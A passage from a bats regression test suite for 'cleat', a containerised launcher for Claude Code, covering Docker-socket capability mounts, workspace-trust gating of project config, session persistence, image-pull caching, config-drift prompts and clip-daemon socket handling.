  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.9.2: bin/cleat's spin_stop also used \r without \033[K, so a shorter
# success message left the tail of the longer spinner line visible. Example:
# "Starting container..." (21 chars) overwritten by "Container started"
# (17 chars) produced "Container startedr..." with the leftover "r..." in
# the spinner's dim color. Same bug as install.sh, different file.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.9.2: bin/cleat spin_stop clears line before writing" {
  # Extract color vars + spin_stop from bin/cleat into an isolated harness,
  # force _is_tty true, and call spin_stop with a shorter success message.
  local harness="$TEST_TEMP/cleat_spin_stop_harness.sh"
  {
    echo '#!/usr/bin/env bash'
    echo '_is_tty() { true; }'
    echo '_has_unicode() { true; }'
    echo '_SPIN_PID=""'
    sed -n "/^BOLD='/,/^RESET='/p" "$CLI"
    sed -n '/^spin_stop()/,/^}$/p' "$CLI"
    echo 'spin_stop 0 "Container started"'
  } > "$harness"

  run bash "$harness"
  assert_success
  assert_output --partial "Container started"

  # Output must contain CR + "clear to EOL" so a shorter success line fully
  # replaces a longer spinner line.
  local clear_seq
  clear_seq=$'\r\033[K'
  [[ "$output" == *"$clear_seq"* ]] || {
    echo "REGRESSION: bin/cleat spin_stop output missing \\r\\033[K line-clear prefix"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.0: docker capability. The headline feature: opt-in access to the
# host Docker daemon so users can test docker-based apps (compose, exec,
# build) without leaving the sandbox. Full design in
# concept/15-docker-capability.md.
#
# The three invariants that must hold:
#   1. `docker` is in KNOWN_CAPS (so config --list/--enable work)
#   2. When the cap is active, /var/run/docker.sock is mounted
#   3. When active, project is also mounted at its host path with workdir
#      set there (so $(pwd) in Cleat == $(pwd) on host, the path-remapping
#      ergonomic fix)
# ─────────────────────────────────────────────────────────────────────────────

@test "regression v0.10.0: docker listed in KNOWN_CAPS" {
  # Guards against accidental removal during cap-list refactors.
  local found=0
  for cap in "${KNOWN_CAPS[@]}"; do
    if [[ "$cap" == "docker" ]]; then found=1; fi
  done
  [[ $found -eq 1 ]] || {
    echo "REGRESSION: docker missing from KNOWN_CAPS (${KNOWN_CAPS[*]})"
    return 1
  }
}

@test "regression v0.10.0: docker cap mounts host socket" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  # Pin the daemon location so the branch is deterministic across the matrix:
  # host-local daemon whose socket resolves to /var/run/docker.sock.
  unset DOCKER_HOST
  _docker_pool_is_vm() { return 1; }
  _docker_context_endpoint() { echo "unix:///var/run/docker.sock"; }

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
docker
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "/var/run/docker.sock:/var/run/docker.sock"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: docker cap mounts project at host path with workdir" {
  # This is the path-remapping fix: inside Cleat, /workspace and the host
  # path both point to the same project, and workdir is set to the host
  # path so $(pwd) returns something the host daemon can find.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
docker
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "$TEST_TEMP/project:$TEST_TEMP/project"
  assert_success
  run assert_docker_run_has "$cname" "--workdir $TEST_TEMP/project"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: docker cap off leaves baseline mounts unchanged" {
  # Docker cap is opt-in; enabling other caps must not accidentally add the
  # socket or host-path mount.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  mkdir -p "$HOME/.ssh"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
ssh
gh
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success
  run assert_docker_run_lacks "$cname" "/var/run/docker.sock"
  assert_success
  run assert_docker_run_lacks "$cname" "--workdir"
  assert_success

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.0: workspace trust. A project's .cleat file lives in the repo and is
# untrusted input. Applying its caps without user approval was the original
# supply-chain footgun (any repo could silently enable ssh/gh/docker on
# clone+run). Workspace trust closes that: project caps require approval
# via prompt, --trust-project flag, CLEAT_TRUST_PROJECT=1 env, or a stored
# approval whose hash still matches the current .cleat caps.
#
# Core invariants:
#   1. Non-interactive + no opt-in → project caps are DROPPED (default-deny)
#   2. Hash is over canonical caps, not raw file: comment edits don't
#      require re-approval
#   3. Global config + --cap CLI flags are never gated (user's own input)
#   4. cleat status never prompts (readonly mode)
#   5. Trust file refuses paths with tab/newline (format corruption)
# ─────────────────────────────────────────────────────────────────────────────

@test "regression v0.10.0: non-TTY + no opt-in skips project .cleat caps" {
  # The supply-chain protection: a malicious repo's .cleat with docker
  # can't silently activate in scripted/CI contexts.
  unset CLEAT_TRUST_PROJECT
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ndocker\n' > "$TEST_TEMP/proj/.cleat"
  _is_tty() { return 1; }

  resolve_caps "$TEST_TEMP/proj" >/dev/null 2>&1
  cap_is_active docker && {
    echo "REGRESSION: docker cap leaked from untrusted .cleat in non-TTY mode"
    return 1
  }
  return 0
}

@test "regression v0.10.0: global config is never gated by trust" {
  # The trust check applies only to project-level .cleat files. The user's
  # own global config must continue to work without any approval flow.
  unset CLEAT_TRUST_PROJECT
  mkdir -p "$TEST_TEMP/proj"
  touch "$HOME/.gitconfig"
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
git
EOF
  _is_tty() { return 1; }
  resolve_caps "$TEST_TEMP/proj" >/dev/null 2>&1
  cap_is_active git || {
    echo "REGRESSION: global config cap was dropped"
    return 1
  }
}

@test "regression v0.10.0: trust hash is over canonical caps (comment-edit safe)" {
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ngit\nssh\n' > "$TEST_TEMP/proj/.cleat"
  local h1 h2
  h1="$(_hash_cleat_caps "$TEST_TEMP/proj/.cleat" "")"
  # Rewrite the file with comments and reordered caps. Same cap set.
  printf '# this is a comment\n[caps]\nssh\n# another comment\ngit\n' > "$TEST_TEMP/proj/.cleat"
  h2="$(_hash_cleat_caps "$TEST_TEMP/proj/.cleat" "")"
  [[ -n "$h1" && "$h1" == "$h2" ]] || {
    echo "REGRESSION: comment/order-only .cleat changes altered the trust hash"
    echo "h1=$h1 h2=$h2"
    return 1
  }
}

@test "regression v0.10.0: trust file refuses control chars in project path" {
  # Tab/newline would corrupt the field- and line-oriented trust file.
  run _trust_record "$(printf '/foo\tbar')" "hash"
  assert_failure
  run _trust_record "$(printf '/foo\nbar')" "hash"
  assert_failure
}

@test "regression v0.10.0: trust hash is pure hex (md5sum junk stripped)" {
  # `md5sum` on Linux appends "  -" (the stdin "filename") after the hash.
  # Without stripping, the stored trust hash contains spaces and "-", which
  # corrupts the tab-separated trust file and breaks lookup. The hash in
  # _hash_cleat_caps must be piped through `awk '{print $1}'` (or
  # equivalent) so only hex survives.
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ngit\nssh\n' > "$TEST_TEMP/proj/.cleat"
  local h
  h="$(_hash_cleat_caps "$TEST_TEMP/proj/.cleat" "")"
  [[ "$h" =~ ^[0-9a-f]+$ ]] || {
    echo "REGRESSION: trust hash contains non-hex chars: '$h'"
    return 1
  }
}

@test "regression v0.10.0: cleat resume after cleat rm creates container and continues" {
  # cleat rm preserves sessions on the host: they live at
  # ~/.claude/projects/<key>/ and aren't touched by cmd_rm. But before
  # this fix, cleat resume errored out with "No container found" when
  # the container was gone, so the user couldn't actually pick up their
  # session without doing `cleat start` (which launches fresh, without
  # --continue). Now cmd_resume auto-creates the container and exec_claude
  # fires --continue so Claude resumes from the persisted host files.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_resume "$TEST_TEMP/project"
  assert_success

  # docker run happened: container was created fresh, not errored.
  run grep "^docker run " "$DOCKER_CALLS"
  assert_success
  assert_output --partial "--name $cname"

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: cmd_rm leaves per-project session dir untouched" {
  # The host session dir at ~/.claude/projects/<key>/ must survive cmd_rm
  # so `cleat resume` (which now auto-creates a fresh container) can
  # --continue from those files.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  mock_docker_ps_a "$(container_name_for "$TEST_TEMP/project")"

  # Compute the session dir path the way bin/cleat does.
  local _bn _h project_key session_dir
  _bn="$(basename "$TEST_TEMP/project" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9-]/-/g')"
  _h="$(echo -n "$TEST_TEMP/project" | _md5 | head -c 8)"
  project_key="${_bn}-${_h}"
  session_dir="${HOME}/.claude/projects/${project_key}"

  mkdir -p "$session_dir"
  echo '{"session":"data"}' > "$session_dir/session-abc.jsonl"

  run cmd_rm "$TEST_TEMP/project"
  assert_success

  [[ -f "$session_dir/session-abc.jsonl" ]] || {
    echo "REGRESSION: cmd_rm deleted the per-project session dir"
    return 1
  }
  local content
  content="$(cat "$session_dir/session-abc.jsonl")"
  [[ "$content" == '{"session":"data"}' ]] || {
    echo "REGRESSION: session content mangled by cmd_rm"
    return 1
  }
}

@test "regression v0.10.0: docker cap overlays session dir at host-path key" {
  # With docker cap active, workdir is the host path, so Claude encodes
  # its session dir from that path ('/a/b' → 'projects/-a-b/') instead
  # of the v0.8.0-assumed 'projects/-workspace/'. Without a second
  # overlay, sessions would split between two host dirs (one per-project,
  # one in the base ~/.claude/projects/<host-path-encoded>/). The docker
  # cap block must mount the per-project session dir at the host-path key
  # so sessions always land in the same place regardless of workdir.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
docker
EOF

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # Host-path key is the project path as Claude Code encodes it: every '/' AND
  # every '.' becomes a dash.
  #
  # This assertion originally hardcoded slash-only replacement, and it passed
  # because the code did the same thing. Both were wrong. Measured against a
  # live box on 2026-07-29, Claude reported its own session path for a workspace
  # under /Users/marcin/.config/... as -Users-marcin--config-..., a DOUBLE dash
  # where "/." appeared. So the docker cap's session unification silently missed
  # for every project path containing a dot, which this test's own mktemp dir
  # (/tmp/tmp.XXXX) is an example of. Now shares one encoder with the overlay
  # generator, so the two cannot drift apart again.
  local host_key
  host_key="$(_claude_session_key "$TEST_TEMP/project")"
  run assert_docker_run_has "$cname" ":/home/coder/.claude/projects/${host_key}"
  assert_success
  # and the encoding is really the dotted one, not slash-only
  case "$TEST_TEMP" in
    *.*) case "$host_key" in
           *.*) echo "key kept a dot: $host_key"; return 1 ;;
         esac ;;
  esac

  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

@test "regression v0.10.0: cmd_status never prompts for trust" {
  # cleat status is read-only. Any trust prompt from it would surprise users
  # and could deadlock scripts that pipe through status.
  unset CLEAT_TRUST_PROJECT
  mkdir -p "$TEST_TEMP/proj"
  printf '[caps]\ndocker\n' > "$TEST_TEMP/proj/.cleat"
  _is_tty() { return 0; }
  mock_docker_images ""
  run cmd_status "$TEST_TEMP/proj"
  assert_success
  refute_output --partial "Trust this project"
  refute_output --partial "Project .cleat"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.1: _do_pull always issued a `docker pull` against GHCR, even when
# the version-tagged image was already on disk. A transient registry/network
# error there (offline, GHCR hiccup, auth blip) returned non-zero from
# `docker pull`, which the caller treated as "image unavailable" and fell
# back to a 2-5 min local build, even though the prebuilt image was
# sitting in the local image store waiting to be reused.
# Fix: short-circuit at the top of _do_pull. If `docker image inspect
# ${REGISTRY_BASE}:v${target_version}` succeeds, retag locally and return
# without any network call.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.10.1: _do_pull reuses locally cached prebuilt without network call" {
  # Registry-tagged image is on disk but no `cleat` alias. Pull would fail
  # by default (DOCKER_PULL_EXIT_CODE=1), so if _do_pull touched the
  # network it would fall back to a local build, both forbidden here.
  mock_docker_image_cached "$REGISTRY_IMAGE"
  mkdir -p "$TEST_TEMP/project"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_failure

  run docker_build_calls
  assert_output ""

  # The cached registry tag was aliased to the local IMAGE_NAME.
  run grep '^docker tag ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial "$REGISTRY_IMAGE"
  assert_output --partial "$IMAGE_NAME"

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  rm -rf "$CLEAT_RUN_DIR/${cname}/settings" "$CLEAT_RUN_DIR/${cname}/hooks"
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.10.1 hardening: the cache short-circuit must not declare success when
# `docker tag` silently fails. Without the fall-through guard, a tag failure
# would leave no `cleat` alias on disk while _do_pull returned 0; the next
# image_exists() check would say "missing" and the user would be back to a
# local build the next time they ran `cleat start`. The guard re-checks
# image_exists() after the tag and falls through to the pull path on
# failure, preserving the GHCR-first contract even when the local image
# store is in a degraded state.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.10.1: _do_pull falls through to network pull when cache-hit tag fails" {
  # Registry-tagged image is on disk, but `docker tag` fails (simulating
  # disk full / permission / etc.). _do_pull must not falsely claim
  # success. It must fall through to the existing pull path. Pull is
  # made to succeed so we can prove the fall-through fired (otherwise
  # we'd land in _do_build and the assertion below would be ambiguous).
  mock_docker_image_cached "$REGISTRY_IMAGE"
  export DOCKER_TAG_EXIT_CODE=1
  export DOCKER_PULL_EXIT_CODE=0

  run cmd_build
  assert_success

  # The fall-through warning must be visible to the user.
  assert_output --partial "could not be tagged"

  # Network pull was attempted (proves we fell through past the cache hit).
  run grep '^docker pull ' "$DOCKER_CALLS"
  assert_success
  assert_output --partial "$REGISTRY_IMAGE"

  unset DOCKER_TAG_EXIT_CODE DOCKER_PULL_EXIT_CODE
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.12.1: `cleat config --enable hooks && cleat` did nothing useful: the
# existing container kept its old mount set (no /var/log/cleat), so hooks
# silently never fired. Drift was detected but the response was a static
# "Run: cleat rm && cleat" notice, invisible to most users.
#
# Fix: cmd_start / cmd_resume / cmd_claude now call _resolve_config_drift
# early, before any docker operation, so a drifted TTY session prompts the
# user to recreate. Without the wiring, the existing capabilities.bats unit
# tests for _resolve_config_drift still pass. This regression pins the
# wiring itself.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.12.1: cmd_start invokes _resolve_config_drift before docker ops" {
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_images "cleat"
  mock_docker_ps_a "$cname"
  is_running() { return 1; }
  exec_claude() { return 0; }

  # Settings overlay must exist or the unrelated stale-mount path fires
  mkdir -p "$CLEAT_RUN_DIR/${cname}/settings"
  echo '{}' > "$CLEAT_RUN_DIR/${cname}/settings/settings.json"

  # Sentinel: set by the spy below if the wiring is intact
  DRIFT_CALLED=0
  _resolve_config_drift() { DRIFT_CALLED=1; }

  cmd_start "$TEST_TEMP/project"

  [[ "$DRIFT_CALLED" == "1" ]] || {
    echo "REGRESSION: cmd_start did not call _resolve_config_drift"
    return 1
  }
}

# v0.12.1 shipped the drift recreate prompt with `echo -n` instead of
# `echo -en`, so ${BOLD}/${RESET} printed as literal `\033[1m`/`\033[0m`
# instead of being interpreted as ANSI escape sequences. The user saw a
# garbled prompt: `Recreate \033[1mcleat-foo\033[0m now? [Y/n]`.
@test "regression v0.12.1: drift recreate prompt interprets ANSI escapes" {
  run bash -c '
    source "'"$CLI"'"
    container_exists() { return 0; }
    _container_config_hash() { echo "v2:old"; }   # current format, so drift is compared (v0.16.4)
    compute_config_fingerprint() { echo "new"; }
    _is_tty() { return 0; }
    is_running() { return 1; }
    export DOCKER_CALLS="'"$DOCKER_CALLS"'" PATH="'"$MOCK_BIN"':$PATH"
    echo "y" | _resolve_config_drift "cleat-foo" ""
  '
  assert_success
  # Bug present → output contains the 7-char literal sequence.
  # Fix in place → those characters appear only as the actual ESC byte + `[1m`,
  # so the literal substring isn't found.
  refute_output --partial '\033[1m'
  refute_output --partial '\033[0m'
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.12.3: `cleat start` aborted with an opaque OCI runtime error
# ("not a directory: Are you trying to mount a directory onto a file...")
# when the settings-overlay dir survived but a specific file inside was
# missing. The pre-fix stale-mount check only verified `[[ -d $overlay_dir ]]`,
# so the partial-rotation state slipped past the gate, fell through to
# `docker start`, and let Docker auto-create the missing bind source as a
# directory, which then failed to mount onto the file destination inside
# the container. Reported in the wild after a long session: user declined
# the drift recreate prompt, container start failed with the OCI error,
# leaving them stuck.
#
# Fix: _settings_overlay_intact also enumerates the container's bind
# sources via `docker inspect` and verifies each one inside the overlay
# dir is a regular file before docker start. When any source is missing
# or the wrong type, cmd_start auto-recreates (the alternative is the
# same opaque failure they hit in production).
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v0.12.3: cmd_start auto-recreates when overlay dir survives but a file is missing" {
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }
  mock_docker_ps_a "$cname"

  # Overlay dir survives with settings.json, but the container's mount set
  # still references project-settings.local.json which was rotated out.
  # This is the exact partial-rotation state the dir-only check missed.
  local overlay_dir="$CLEAT_RUN_DIR/${cname}/settings"
  mkdir -p "$overlay_dir"
  echo '{}' > "$overlay_dir/settings.json"
  # docker inspect must report both sources so the helper can spot the
  # missing one. The mock returns this for ALL inspect calls in this test,
  # fine because _container_config_hash isn't on the cmd_start path
  # under the bypassed _resolve_config_drift in setup().
  mock_docker_inspect "${overlay_dir}/settings.json
${overlay_dir}/project-settings.local.json"

  run cmd_start "$TEST_TEMP/project"
  assert_success
  assert_output --partial "Recreating container"
  assert_output --partial "host paths changed"
  run docker_calls
  assert_output --partial "docker rm -f $cname"
  assert_output --partial "docker run"
  refute_output --partial "docker start $cname"

  rm -rf "$overlay_dir" "$CLEAT_RUN_DIR/${cname}/clip"
}

# ── v0.13.0: `./test.sh` must not hang on an interactive terminal ────────────
# The open-bridge shim (installed in the container as open/xdg-open) read fd0
# via `cat` when invoked with no URL. The open-bridge "rejects empty input" test
# in hooks.bats runs it with an empty arg; when `./test.sh` is run in a terminal
# (stdin = TTY, inherited through bats), `cat` blocked forever and the whole
# suite hung at the hooks file. Two complementary guards below.

@test "regression v0.13.0: open-bridge does not read stdin when fd0 is a tty" {
  # Root-cause fix lives in the shipped shim: it must guard the `cat` read behind
  # a "not a terminal" check so an interactive `open`/`xdg-open` with no argument
  # (and the empty-input test) falls through to usage instead of blocking. A pipe
  # is still consumed because a pipe is not a tty.
  local script="$PROJECT_ROOT/docker/open-bridge"
  [[ -f "$script" ]] || { echo "open-bridge shim missing"; return 1; }
  grep -qE '\[ *! -t 0 *\]' "$script" || {
    echo "open-bridge reads stdin without a tty guard; interactive use can hang"
    return 1
  }
}

@test "regression v0.13.0: test runner isolates bats stdin from the terminal" {
  # Defense in depth: the per-file loop must run bats with stdin from /dev/null
  # so any future test that reads fd0 gets EOF (matching CI) instead of blocking
  # on the developer's terminal.
  local runner="$PROJECT_ROOT/test.sh"
  [[ -f "$runner" ]] || { echo "test.sh missing"; return 1; }
  grep -qE '"\$BATS" "\$f".*</dev/null' "$runner" || {
    echo "test.sh runs bats without </dev/null; interactive ./test.sh can hang"
    return 1
  }
}

# ─────────────────────────────────────────────────────────────────────────────
# v0.13.1: two bugs surfaced when the v0.13.0 upgrade forced a container
# recreate on a macOS host (host uid 501, image-baked coder uid 1000):
#
#   (A) FREEZE: v0.13.0 made ~/.local writable, re-enabling Claude Code's
#       launch-time self-updater, which hangs the TUI under `docker exec -it` on
#       a fresh container. Fix: disable it via DISABLE_AUTOUPDATER=1 in the
#       session env: cleat owns Claude's version (image + `cleat upgrade-claude`).
#
#   (B) CLIP EPERM STORM: `docker exec ... runuser -u coder` could fire before
#       the entrypoint finished remapping coder 1000→501, so clip-daemon stamped
#       /tmp/clip.* as uid 1000; later 501 sessions couldn't unlink them from the
#       sticky /tmp. Fixes: wait for the remap before exec, AND give clip-daemon a
#       per-uid runtime dir so two uids can never collide on one socket.
# ─────────────────────────────────────────────────────────────────────────────

@test "regression v0.13.1: session env disables Claude's launch-time auto-updater" {
  # The freeze cause was Claude's in-container self-updater running at launch.
  # Cleat manages Claude's version itself, so the session must pass
  # DISABLE_AUTOUPDATER=1 to claude.
  _host_open_cmd() { echo ""; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  run assert_docker_exec_has "DISABLE_AUTOUPDATER=1"
  assert_success
}

@test "regression v0.13.1: session waits for the UID remap before launching" {
  # The wrong-uid / clip-EPERM cause was the session exec racing the entrypoint's
  # /etc/passwd remap. exec_claude must probe `id -u coder` in the container
  # before launching, so clip-daemon and claude never run as the stale image uid.
  _host_open_cmd() { echo ""; }
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_success
  run assert_docker_exec_has "id -u coder"
  assert_success
}

@test "regression v0.13.1: clip-daemon uses a per-uid runtime dir, not shared /tmp/clip.sock" {
  # Stale, foreign-owned /tmp/clip.sock in the sticky /tmp was the wedge. The
  # daemon must honor CLEAT_CLIP_DIR (a per-uid dir) for its socket so two uids
  # can never collide. Stub socat so we observe the bind path without listening.
  local rundir="$TEST_TEMP/clip-run"
  local stubs="$TEST_TEMP/clipd-stubs"; mkdir -p "$stubs" "$rundir"
  local socat_log="$TEST_TEMP/socat-args.log"; : > "$socat_log"
  printf '#!/bin/sh\necho "$@" >> "%s"\nexit 0\n' "$socat_log" > "$stubs/socat"
  chmod +x "$stubs/socat"
  run env PATH="$stubs:$PATH" CLEAT_CLIP_DIR="$rundir" bash "$PROJECT_ROOT/docker/clip-daemon"
  run cat "$socat_log"
  assert_output --partial "$rundir/clip.sock"
}

@test "regression: clip-daemon passes socat an inactivity timeout (-T) so hung handlers can't exhaust PIDs" {
  # A client that connects but never sends/closes left a handler hung on
  # `head -c` forever; accumulated hung handlers were the fork-storm. The
  # listener must carry socat's -T inactivity timeout.
  local rundir="$TEST_TEMP/clip-run"
  local stubs="$TEST_TEMP/clipd-stubs"; mkdir -p "$stubs" "$rundir"
  local socat_log="$TEST_TEMP/socat-args.log"; : > "$socat_log"
  printf '#!/bin/sh\necho "$@" >> "%s"\nexit 0\n' "$socat_log" > "$stubs/socat"
  chmod +x "$stubs/socat"
  run env PATH="$stubs:$PATH" CLEAT_CLIP_DIR="$rundir" bash "$PROJECT_ROOT/docker/clip-daemon"
  run cat "$socat_log"
  assert_output --partial "-T 5"
}

@test "regression v0.13.1: clip shim and clip-daemon resolve the SAME socket path" {
  # The OSC52 fallback only works if `clip` connects to the exact socket
  # clip-daemon binds. Both derive it from CLEAT_CLIP_DIR / the per-uid dir; a
  # divergence (e.g. one left at /tmp/clip.sock) silently breaks paste. Evaluate
  # the real assignment lines from each shipped script and compare.
  local daemon_sock clip_sock
  daemon_sock="$(CLEAT_CLIP_DIR=/probe bash -c 'eval "$(grep -E "^(RUNDIR|SOCK)=" "'"$PROJECT_ROOT/docker/clip-daemon"'")"; printf %s "$SOCK"')"
  clip_sock="$(CLEAT_CLIP_DIR=/probe bash -c 'eval "$(grep -E "^SOCK=" "'"$PROJECT_ROOT/docker/clip"'")"; printf %s "$SOCK"')"
  assert_equal "$daemon_sock" "/probe/clip.sock"
  assert_equal "$clip_sock" "/probe/clip.sock"
  assert_equal "$clip_sock" "$daemon_sock"
}

@test "regression v0.15.0: browser bridge consumes each URL once (no per-watcher duplicate opens)" {
  # A session that dies without its cleanup trap (crash / SIGKILL / closed
  # terminal) orphans its disowned _browser_watcher. The next session on the same
  # cname reuses the clip dir and starts ANOTHER watcher, so N watchers each open
  # every URL → one in-container `open` produced N host tabs. The fix consumes
  # the bridge file with an atomic rename: exactly one watcher claims each URL.
  local bridge="$TEST_TEMP/.browser-open"
  printf '%s\n' "https://example.com/oauth" > "$bridge"
  # Two watchers racing the same bridge file (orphan + current).
  run _browser_claim_url "$bridge"
  assert_success
  assert_output --partial "https://example.com/oauth"
  # The second watcher must find nothing: one tab, not two.
  run _browser_claim_url "$bridge"
  assert_failure
}

# v0.15.0: the config-drift notice shipped as a cyan-bordered _notice_box with
# blank-line padding. It now renders as plain text in the "New in v…" style (no
# box, no empty lines), per the maintainer's startup-output taste. The bug we
# guard against is the bordered box returning. Exercises the non-TTY branch
# (no prompt) so the whole notice is in captured output; mutating that branch's
# `info` back to `_notice_box` reintroduces the border and trips the refutes.
@test "regression v0.15.0: config-drift notice is plain text, not a box" {
  run bash -c '
    source "'"$CLI"'"
    container_exists() { return 0; }
    _container_config_hash() { echo "v2:old"; }   # current format, so drift is compared (v0.16.4)
    compute_config_fingerprint() { echo "new"; }
    _is_tty() { return 1; }
    _resolve_config_drift "cleat-foo" ""
  '
  assert_success
  assert_output --partial "Config changed"
  assert_output --partial "cleat-foo"
  refute_output --partial "┌"
  refute_output --partial "└"
  refute_output --partial "│"
}

# v0.15.0: the image-rebuild prompt opened with a stray `echo ""`, leaving a
# blank line between the preceding "✔ Removed …" (drift recreate) and the
# notice, visible in the wild on a drift→rebuild startup. The leading blank is
# gone; the notice is now the first byte of output. Command substitution strips
# trailing newlines but PRESERVES a leading one, so re-adding `echo ""` makes
# $out start with a newline and trips the guard.
@test "regression v0.15.0: image-rebuild notice has no leading blank line" {
  _is_tty() { return 0; }
  image_exists() { return 0; }
  # Pre-stamping image older than the content intro → prompt fires.
  _image_spec_version() { echo ""; }
  _image_cleat_version() { echo "0.0.1"; }
  cmd_rebuild() { :; }
  container_exists() { return 1; }
  is_running() { return 1; }
  _REBUILD_PROMPTED=0
  local out
  out="$(_maybe_prompt_image_rebuild "cleat-x-12345678" <<< "n" 2>&1)"
  [[ "$out" == *"out of date"* ]] \
    || { echo "notice missing: $out"; return 1; }
  [[ "$out" != $'\n'* ]] \
    || { echo "REGRESSION: leading blank line before rebuild notice"; return 1; }
}

@test "regression v0.15.0: version bump alone does not trigger config drift" {
  # The config fingerprint must depend ONLY on caps + env keys, never the CLI
  # version. Folding version in made every release fire a false "caps or env
  # keys differ" drift notice on existing containers whose setup was untouched,
  # with a remedy (recreate from the same image) that fixes nothing for a
  # version change. Version drift is _maybe_prompt_image_rebuild's job.
  run bash -c '
    source "'"$CLI"'"
    ACTIVE_CAPS=(git env)
    _RESOLVED_ENV_ARGS=(-e "FOO=bar")
    VERSION="0.14.0"; h1="$(compute_config_fingerprint)"
    VERSION="0.15.0"; h2="$(compute_config_fingerprint)"
    [[ "$h1" == "$h2" ]] || { echo "DRIFTED: $h1 vs $h2" >&2; exit 1; }
    echo "STABLE"
  '
  assert_success
  assert_output --partial "STABLE"
}

@test "regression: caps reader keeps a final line that lacks a trailing newline" {
  # A hand-edited .cleat ending in a capability with no trailing newline
  # (printf '[caps]\nenv') silently dropped that last cap: _read_caps_from_file
  # looped with a bare `while IFS= read -r line` and no `|| [[ -n "$line" ]]`, so
  # the unterminated final line was lost. The project's requested cap was never
  # seen, so no trust prompt fired and the cap never applied (and the box drifted
  # because it had been created when the cap still applied). Fix mirrors
  # _parse_env_file. Reproduce the exact input: env on the last line, no newline.
  printf '[caps]\nenv' > "$TEST_TEMP/.cleat"
  run _read_caps_from_file "$TEST_TEMP/.cleat"
  assert_success
  [[ "$output" == *"env"* ]] \
    || { echo "REGRESSION: last capability dropped from a no-trailing-newline .cleat"; return 1; }
}

@test "regression: [resources] reader keeps a final line that lacks a trailing newline" {
  # Same class as the caps-reader bug: _read_resource_from_file looped with a
  # bare `while IFS= read -r line` and no `|| [[ -n "$line" ]]`, so a hand-edited
  # .cleat ending in `memory = 8g` with no trailing newline silently dropped the
  # configured ceiling and the box fell back to the VM-derived default. The
  # header comment even claimed "Same parsing hygiene as [caps]", which was false.
  printf '[resources]\nmemory = 8g' > "$TEST_TEMP/.cleat"
  run _read_resource_from_file "$TEST_TEMP/.cleat" memory
  assert_success
  [[ "$output" == "8g" ]] \
    || { echo "REGRESSION: configured ceiling dropped from a no-trailing-newline [resources]"; return 1; }
}

@test "regression v0.15.1: rotated SSH-agent socket after reboot recreates instead of failing to start" {
  # macOS launchd regenerates the SSH agent socket directory
  # (…/com.apple.launchd.XXXX/Listeners) on every reboot, so SSH_AUTH_SOCK
  # rotates. A stopped ssh-cap container has the OLD path baked into its mount
  # spec; `docker start` re-mounts it and aborts with an opaque OCI error:
  #   error mounting "…/Listeners" to rootfs at "/tmp/ssh-agent.sock" …
  #   not a directory. cmd_start must detect the vanished bind source up front
  # and recreate (the settings overlay alone never caught it).
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  is_running() { return 1; }
  mock_docker_ps_a "$cname"
  # Settings overlay intact, so the OTHER stale-check passes …
